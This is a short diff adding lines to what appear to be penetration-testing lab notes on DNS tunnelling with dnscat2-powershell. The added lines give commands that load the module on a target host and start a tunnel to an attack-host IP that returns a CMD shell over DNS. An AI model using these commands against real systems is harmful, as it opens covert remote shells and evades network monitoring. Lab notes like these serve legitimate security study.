@@ -23,4 +23,17 @@ git clone https://github.com/lukebaggett/dnscat2-powershell.git
 ```
 clone dnscat2-powershell file and transfer it on the target host
 
+```
+Import-Module .\dnscat2.ps1
 
+```
+import the module 
+```
+ Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+```
+establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
+
+```
+dnscat2> window -i 1
+```
+interact with the session
